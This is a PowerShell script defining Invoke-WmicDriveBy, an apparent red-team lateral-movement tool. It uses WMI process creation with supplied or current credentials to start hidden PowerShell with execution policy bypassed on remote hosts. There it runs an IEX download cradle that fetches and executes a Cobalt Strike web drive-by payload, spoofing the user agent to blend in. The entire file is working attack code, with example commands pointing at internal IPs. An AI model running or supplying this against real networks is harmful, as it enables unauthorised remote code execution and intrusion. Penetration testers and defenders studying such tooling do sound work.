function Invoke-WorkerWmicDriveBy{
    param(
    #Parameter assignment
    [Parameter(Mandatory = $True, Position = 0)] 
    [string]$URL,
    [Parameter(Mandatory = $False, Position = 1)] 
    [string]$User,
    [Parameter(Mandatory = $False, Position = 2)] 
    [string]$Pass,
    [Parameter(Mandatory = $False, Position = 3)] 
    [string[]]$TARGETS = "."

  )

    if($User -and $Pass){
      #Did the user specify credentials?
      Write-Verbose "Set to run with Username: $User and Password: $Pass"

      $password = ConvertTo-SecureString $Pass -asplaintext -force 
      $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password

      #Set the proxy and user agent to blend in

      $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
      $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"

      Write-Verbose "Executing `"$cmd`" on `"$Target`""
      Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -Credential $cred -ComputerName $TARGETS 

    }
    else{
      Write-Verbose "Username and/or password not specified. Running in current user context."
    
      #Set the proxy and user agent to blend in
      $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
      $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"
    
      Write-Verbose "Executing `"$cmd`" on `"$Target`""
      Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -ComputerName $TARGETS
    }
}

function Invoke-WmicDriveBy{

  <#
  .SYNOPSIS
  This script uses wmic to open a powershell process and use the IEX download cradle to execute a powershell web drive by payload.

  .DESCRIPTION 
  This function calls wmic process call create to execute the powershell command for the IEX download cradle. The cradle is used to execute a payload delivered via
  the powershell web drive by exploitation module in cobaltstrike. Wmic runs with the permissions of the current user by default.

  .EXAMPLE
  > Invoke-WmicDriveBy http://127.0.0.1/update -User test\jonny -Pass "Kg^*dksLkD$" -TARGET 192.168.1.10
  Run the script with user credentials for a specific host

  .EXAMPLE
  > Invoke-WmicDriveBy http://192.168.1.101/a 
  Run the script against the localhost with the current user credentials

  .PARAMETER User
  Specify a username  Default is the current user context. 

  .PARAMETER Pass
  Specify the password for the appropriate user

  .PARAMETER URL
  URL for the powershell web delivery. Required. 

  .PARAMETER TARGET
  Host to target. Can be a hostname, IP address, or FQDN. Default is set to localhost. 

  #>

  param(
    #Parameter assignment
    [Parameter(Mandatory = $True, Position = 0)] 
    [string]$URL,
    [Parameter(Mandatory = $False, Position = 1)] 
    [string]$User,
    [Parameter(Mandatory = $False, Position = 2)] 
    [string]$Pass,
    [Parameter(ValueFromPipeline=$True,Mandatory = $False, Position = 3)] 
    [string[]]$TARGETS = "."

  )

  

  Begin
  {
    #Check if the TARGETS parameter was passed through the pipeline. Set the usedParameter variable to true. 
    $usedParameter = $False 
    if($PSBoundParameters.ContainsKey('TARGETS'))
    {
      $usedParameter = $True 
    }

  }

  Process
  {
    #If targets is passed via the parameter, complete function for each host. 
    if($usedParameter)
    {
      Foreach($computer in $TARGETS)
      {
        Invoke-WorkerWmicDriveBy "$URL" -User "$User" -Pass "$Pass" -TARGET "$computer" 
      }
    }
    #Pass the value from the pipeline to the target parameter if the usedParameter variable is false.
    else
    {
      Invoke-WorkerWmicDriveBy "$URL" -User "$User" -Pass "$Pass" -TARGET $_
    }
  }

  end{}
}
